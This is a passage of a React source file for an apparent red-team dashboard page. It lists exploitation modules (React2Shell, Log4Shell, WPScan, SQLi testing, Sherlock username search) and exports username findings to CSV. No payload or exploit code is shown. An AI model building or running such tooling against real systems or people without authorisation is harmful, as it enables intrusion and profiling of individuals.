                  <span className="text-xs font-mono px-1.5 py-0.5 rounded flex-shrink-0"
                    style={{
                      background: (CATEGORY_META[f.category]?.color || '#74c7ec') + '20',
                      color: CATEGORY_META[f.category]?.color || '#74c7ec'
                    }}>
                    {f.category}
                  </span>
                </a>
              ))}
            </div>

            {/* Export */}
            {totalFound > 0 && (
              <button
                onClick={() => {
                  const lines = (results[activeUser] || []).map(f => `${f.site},${f.url},${f.category}`)
                  const csv = ['Site,URL,Category', ...lines].join('\n')
                  const blob = new Blob([csv], {type: 'text/csv'})
                  const a = document.createElement('a')
                  a.href = URL.createObjectURL(blob)
                  a.download = `sherlock_${activeUser}_${new Date().toISOString().slice(0,10)}.csv`
                  a.click()
                }}
                className="flex-shrink-0 flex items-center justify-center gap-2 py-2 rounded-lg font-mono text-xs border border-border-default text-text-muted hover:text-accent-primary hover:border-accent-primary transition-all">
                ↓ Export CSV ({allFindings.length} results)
              </button>
            )}
          </div>
        )}
      </div>
    </div>
  )
}

export default function AdvancedToolsPage() {
  const [activeTool, setActiveTool] = useState('react2shell')

  return (
    <div className="flex flex-col space-y-4 animate-fade-in" style={{ height: 'calc(100vh - 100px)' }}>
      <div className="flex items-center justify-between flex-shrink-0">
        <div>
          <h1 className="text-2xl font-display font-bold text-text-primary flex items-center gap-3">
            <Zap size={24} className="text-accent-primary" /> Advanced Tools
          </h1>
          <p className="text-text-muted text-sm font-mono mt-1">Custom exploitation modules — internal red team arsenal</p>
        </div>
        <span className="text-xs font-mono text-text-muted border border-border-default px-3 py-1.5 rounded-lg">
          {TOOLS.length} modules loaded
        </span>
      </div>

      <div className="flex gap-4 flex-1 min-h-0">
        {/* Sidebar */}
        <div className="w-72 flex-shrink-0 flex flex-col gap-2 overflow-y-auto pr-1">
          {TOOLS.map(tool => (
            <ToolCard key={tool.id} tool={tool} selected={activeTool === tool.id} onClick={() => setActiveTool(tool.id)} />
          ))}
          <div className="p-4 rounded-xl border border-dashed border-border-default text-center opacity-30">
            <p className="text-xs font-mono text-text-muted">+ tambah modul baru</p>
          </div>
        </div>

        {/* Module content — all rendered, hidden when inactive to preserve state */}
        <div className="flex-1 min-h-0 min-w-0 relative">
          <div style={{display: activeTool === 'react2shell' ? 'block' : 'none'}} className="h-full">
            <ErrorBoundary><React2ShellModule onSwitchTool={setActiveTool} /></ErrorBoundary>
          </div>
          <div style={{display: activeTool === 'scan_engine' ? 'block' : 'none'}} className="h-full">
            <ErrorBoundary><ScanEngineModule /></ErrorBoundary>
          </div>
          <div style={{display: activeTool === 'wpscan' ? 'block' : 'none'}} className="h-full">
            <ErrorBoundary><WPScanModule /></ErrorBoundary>
          </div>
          <div style={{display: activeTool === 'log4shell' ? 'block' : 'none'}} className="h-full">
            <ErrorBoundary><Log4ShellModule /></ErrorBoundary>
          </div>
          <div style={{display: activeTool === 'sherlock' ? 'block' : 'none'}} className="h-full">
            <ErrorBoundary><SherlockModule /></ErrorBoundary>
          </div>
          <div style={{display: activeTool === 'sqli' ? 'flex' : 'none'}} className="h-full items-center justify-center">
            <div className="text-center space-y-4">
              <p className="text-4xl">💉</p>
              <p className="text-sm font-mono font-bold text-text-primary">SQLi Testing</p>
              <p className="text-xs font-mono text-text-muted">SQL Injection testing tool</p>
              <a href="/sqli" target="_blank"
                className="inline-flex items-center gap-2 px-4 py-2 btn-primary rounded-lg font-mono text-sm font-bold">
                Open SQLi Testing →
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
